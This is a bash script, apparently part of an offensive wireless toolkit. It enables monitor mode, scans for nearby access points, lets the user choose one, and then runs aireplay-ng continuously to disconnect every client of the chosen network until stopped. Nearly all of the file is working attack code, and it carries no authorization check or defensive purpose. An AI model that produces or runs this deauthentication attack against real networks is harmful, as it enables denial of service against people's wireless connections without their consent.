#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "DEAUTH — TARGETED AP" "select specific AP · kick all its clients · aircrack-ng"

require_tool airmon-ng  "apt install aircrack-ng"
require_tool airodump-ng "apt install aircrack-ng"
require_tool aireplay-ng "apt install aircrack-ng"

outdir="$(make_outdir)"
outfile="$outdir/deauth_target.txt"
: > "$outfile"

# ── Pipeline: skip (requires interactive AP selection) ────────────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  printf '  %s[CHAIN]%s WiFi Deauth Target requires interactive AP selection — skipping in pipeline%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  mark_done "$outfile"
  exit 0
fi

TMP_DIR="$(mktemp -d /tmp/deauth_tgt_XXXXXX)"

# ── Interface selection ────────────────────────────────────────────────────────
section "WIRELESS INTERFACE"

mapfile -t _wifi < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
if [[ ${#_wifi[@]} -eq 0 ]]; then
  printf '  %s[!]%s No wireless interfaces found%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi

for i in "${!_wifi[@]}"; do
  printf '  %s[%02d]%s  %s\n' "${CYAN}" "$((i+1))" "${RESET}" "${_wifi[$i]}"
done

printf '\n  %s>>%s Interface [1-%d]: ' "${CYAN}" "${RESET}" "${#_wifi[@]}"
read -r _sel; _sel="${_sel:-1}"

if ! [[ "$_sel" =~ ^[0-9]+$ ]] || (( _sel < 1 || _sel > ${#_wifi[@]} )); then
  printf '  %s[!]%s Invalid selection%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi
IFACE="${_wifi[$((_sel-1))]}"

printf '  %s>>%s Scan duration in seconds [10]: ' "${CYAN}" "${RESET}"
read -r _t; SCAN_TIME="${_t:-10}"

printf '\n  %s[SYS]%s Interface : %s%s%s\n\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
printf 'Interface: %s\n' "$IFACE" >> "$outfile"

# ── Monitor mode ──────────────────────────────────────────────────────────────
section "MONITOR MODE"

printf '  %s[*]%s Enabling monitor mode...%s\n' "${CYAN}" "${RESET}" "${RESET}"
airmon-ng check kill 2>/dev/null | tee -a "$outfile" || true
airmon-ng start "$IFACE" 2>/dev/null | tee -a "$outfile"

MON_IFACE=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}' | head -1)
if [[ -z "$MON_IFACE" ]]; then
  ip link show "${IFACE}mon" &>/dev/null && MON_IFACE="${IFACE}mon" || MON_IFACE="$IFACE"
fi
if ! iw dev "$MON_IFACE" info 2>/dev/null | grep -q "type monitor"; then
  ip link set "$IFACE" down
  iw dev "$IFACE" set type monitor || { printf '  %s[!]%s Monitor mode failed%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1; }
  ip link set "$IFACE" up
  MON_IFACE="$IFACE"
fi

printf '  %s[+]%s Monitor interface: %s%s%s\n\n' "${GREEN}" "${RESET}" "${CYAN}" "$MON_IFACE" "${RESET}"
printf 'Monitor: %s\n' "$MON_IFACE" >> "$outfile"

_restore() {
  printf '\n  %s[*]%s Restoring interface...%s\n' "${CYAN}" "${RESET}" "${RESET}"
  airmon-ng stop "$MON_IFACE" 2>/dev/null || true
  ip link set "$IFACE" down 2>/dev/null
  iw dev "$IFACE" set type managed 2>/dev/null || true
  ip link set "$IFACE" up 2>/dev/null
  rm -rf "$TMP_DIR"
}
trap '_restore' EXIT

# ── Scan ──────────────────────────────────────────────────────────────────────
section "NETWORK SCAN"

printf '  %s[*]%s Scanning for %ss...%s\n\n' "${CYAN}" "${RESET}" "$SCAN_TIME" "${RESET}"
airodump-ng -w "$TMP_DIR/scan" --output-format csv "$MON_IFACE" &>/dev/null &
_pid=$!
sleep "$SCAN_TIME"
kill "$_pid" 2>/dev/null; wait "$_pid" 2>/dev/null

CSV="$TMP_DIR/scan-01.csv"
if [[ ! -f "$CSV" ]]; then
  printf '  %s[!]%s No scan output found.%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi

declare -A NET_ARRAY
declare -a NET_ORDER
_idx=1
while IFS=, read -r _bssid _f2 _f3 _ch _f5 _f6 _f7 _f8 _f9 _f10 _f11 _f12 _f13 _essid _rest; do
  _bssid="${_bssid// /}"; _ch="${_ch// /}"; _essid="${_essid// /}"
  [[ "$_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
  [[ -z "$_ch" ]] && continue
  NET_ARRAY[$_idx]="$_bssid,$_ch,$_essid"
  NET_ORDER+=("$_idx")
  ((_idx++))
done < <(grep -E "^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}" "$CSV")

if [[ ${#NET_ORDER[@]} -eq 0 ]]; then
  printf '  %s[!]%s No networks found.%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi

printf '  %s[*]%s Detected networks:\n\n' "${CYAN}" "${RESET}"
printf '=== NETWORKS ===\n' >> "$outfile"
for _i in "${NET_ORDER[@]}"; do
  IFS=, read -r _b _ch _e <<< "${NET_ARRAY[$_i]}"
  printf '  %s[%02d]%s  %-20s  CH%-3s  %s\n' "${CYAN}" "$_i" "${RESET}" "$_b" "$_ch" "$_e"
  printf '[%02d] %s CH%s %s\n' "$_i" "$_b" "$_ch" "$_e" >> "$outfile"
done

# ── Target selection ───────────────────────────────────────────────────────────
printf '\n  %s>>%s Select network to deauth: ' "${CYAN}" "${RESET}"
read -r CHOICE

if [[ -z "${NET_ARRAY[$CHOICE]:-}" ]]; then
  printf '  %s[!]%s Invalid choice.%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi

IFS=, read -r BSSID CHANNEL ESSID <<< "${NET_ARRAY[$CHOICE]}"
printf '\n  %s[SYS]%s Target: %s%s%s  CH%s\n\n' "${CYAN}" "${RESET}" "${GREEN}" "$BSSID" "${RESET}" "$CHANNEL"
printf 'Target: %s CH%s (%s)\n' "$BSSID" "$CHANNEL" "$ESSID" >> "$outfile"

# ── Deauthentication (continuous) ─────────────────────────────────────────────
section "DEAUTHENTICATION"

printf '  %s[*]%s Deauthing %s%s%s (CH%s) — press %sCTRL+C%s to stop%s\n\n' \
  "${CYAN}" "${RESET}" "${GREEN}" "${BSSID}" "${RESET}" "$CHANNEL" "${BOLD}" "${RESET}" "${RESET}"

iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null || true
aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE" 2>&1 | tee -a "$outfile"

printf '\n  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
